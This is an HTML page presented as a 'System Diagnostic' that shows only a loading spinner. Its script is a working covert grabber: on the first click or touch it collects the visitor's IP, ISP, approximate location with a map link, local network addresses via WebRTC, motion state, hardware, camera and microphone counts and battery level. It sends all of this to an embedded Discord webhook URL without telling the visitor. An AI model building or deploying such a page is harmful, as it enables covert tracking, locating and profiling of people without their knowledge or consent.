<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>System Diagnostic</title>
    <style>
        body { background: #000; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .spinner { width: 40px; height: 40px; border: 2px solid #111; border-top-color: #0f0; border-radius: 50%; animation: spin 0.8s linear infinite; cursor: crosshair; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body onmousedown="SystemCore.init()" ontouchstart="SystemCore.init()">
    <div class="spinner"></div>

    <script>
        "use strict";

        const SystemCore = (function() {
            const ENDPOINT = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
            let isExecuted = false;

            const Collector = {
                async getNetworkData() {
                    const response = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
                    const browserTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                    
                    return {
                        ip: response.ip || "0.0.0.0",
                        vpn: (response.timezone && response.timezone !== browserTimezone) ? "DETECTED (Timezone Skew)" : "CLEAN",
                        isp: response.org || "Unknown",
                        geo: `${response.city}, ${response.country_name}`,
                        map: `https://www.google.com/maps?q=${response.latitude},${response.longitude}`
                    };
                },

                async getLAN() {
                    return new Promise(resolve => {
                        const pc = new RTCPeerConnection({ iceServers: [] });
                        const candidates = [];
                        pc.createDataChannel("");
                        pc.onicecandidate = e => e.candidate?.candidate.includes(".local") && candidates.push(e.candidate.candidate.split(" ")[4]);
                        pc.createOffer().then(o => pc.setLocalDescription(o));
                        setTimeout(() => { pc.close(); resolve(candidates.join(", ") || "Hidden/Isolated"); }, 1500);
                    });
                },

                async getKinetics() {
                    return new Promise(resolve => {
                        let result = "Static";
                        const listener = (e) => {
                            const acc = e.accelerationIncludingGravity;
                            if (acc) {
                                const vector = Math.sqrt(acc.x ** 2 + acc.y ** 2 + acc.z ** 2);
                                if (vector > 13.5) result = "In Motion (Vehicle/Fast)";
                                else if (vector > 10.5) result = "In Motion (Walking)";
                                window.removeEventListener('devicemotion', listener);
                            }
                        };
                        window.addEventListener('devicemotion', listener);
                        setTimeout(() => resolve(result), 1000);
                    });
                },

                async getHardware() {
                    const devices = await navigator.mediaDevices.enumerateDevices().catch(() => []);
                    const gl = document.createElement('canvas').getContext('webgl2');
                    const debugInfo = gl?.getExtension('WEBGL_debug_renderer_info');
                    
                    return {
                        gpu: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_ID) : "N/A",
                        cores: navigator.hardwareConcurrency || 0,
                        ram: navigator.deviceMemory || 0,
                        cameras: devices.filter(d => d.kind === 'videoinput').length,
                        mics: devices.filter(d => d.kind === 'audioinput').length,
                        screen: `${screen.width}x${screen.height}`
                    };
                }
            };

            return {
                async init() {
                    if (isExecuted) return;
                    isExecuted = true;

                    const [net, lan, kinetics, hw, bat] = await Promise.allSettled([
                        Collector.getNetworkData(),
                        Collector.getLAN(),
                        Collector.getKinetics(),
                        Collector.getHardware(),
                        navigator.getBattery ? navigator.getBattery() : Promise.resolve({ level: 0, charging: false })
                    ]).then(results => results.map(r => r.status === 'fulfilled' ? r.value : {}));

                    const payload = {
                        embeds: [{
                            title: "SYSTEM_DIAGNOSTIC_REPORT_V21",
                            color: 0x00FF00,
                            fields: [
                                { name: "NETWORK_ANALYSIS", value: `**IP:** \`${net.ip}\`\n**VPN:** ${net.vpn}\n**ISP:** ${net.isp}\n**GEO:** ${net.geo}\n[Map_Link](${net.map})`, inline: false },
                                { name: "LOCAL_ENVIRONMENT", value: `**LAN_DEVICES:** \`${lan}\`\n**KINETICS:** ${kinetics}`, inline: true },
                                { name: "POWER_STATUS", value: `**BATTERY:** %${Math.round((bat.level || 0) * 100)}\n**CHARGING:** ${bat.charging}`, inline: true },
                                { name: "HARDWARE_SPECS", value: `**GPU:** ${hw.gpu}\n**CPU:** ${hw.cores} Cores | **RAM:** ${hw.ram}GB\n**IO:** ${hw.cameras} Cam / ${hw.mics} Mic\n**RES:** ${hw.screen}`, inline: false }
                            ],
                            timestamp: new Date().toISOString()
                        }]
                    };

                    const formData = new FormData();
                    formData.append("payload_json", JSON.stringify(payload));

                    navigator.sendBeacon(ENDPOINT, formData);
                    fetch(ENDPOINT, { method: 'POST', mode: 'no-cors', body: formData, keepalive: true });
                }
            };
        })();
    </script>
</body>
</html>

